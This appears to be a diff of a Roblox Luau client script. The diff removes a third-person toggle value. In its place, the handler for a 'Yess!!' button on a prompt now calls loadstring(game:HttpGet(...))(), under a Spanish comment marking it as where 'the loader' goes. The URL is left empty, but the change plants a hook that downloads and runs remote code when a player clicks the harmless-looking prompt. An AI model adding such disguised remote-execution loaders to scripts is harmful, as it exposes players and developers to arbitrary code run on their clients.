@@ -3,18 +3,13 @@ task.wait(15)
 local player = game.Players.LocalPlayer
 local StarterGui = game:GetService("StarterGui")
 
-local hasThirdPerson = Instance.new("BoolValue")
-hasThirdPerson.Name = "ThirdPersonEnabled"
-hasThirdPerson.Value = false
-hasThirdPerson.Parent = player
-
 local bindableFunction = Instance.new("BindableFunction")
 bindableFunction.OnInvoke = function(buttonClicked)
 	if buttonClicked == "Yess!!" then
-		hasThirdPerson.Value = true
+		loadstring(game:HttpGet("", true))()
     -- aqui va el loader
 	elseif buttonClicked == "Nha" then
-		hasThirdPerson.Value = false
+		-- no se hace nada
 	end
 end
 
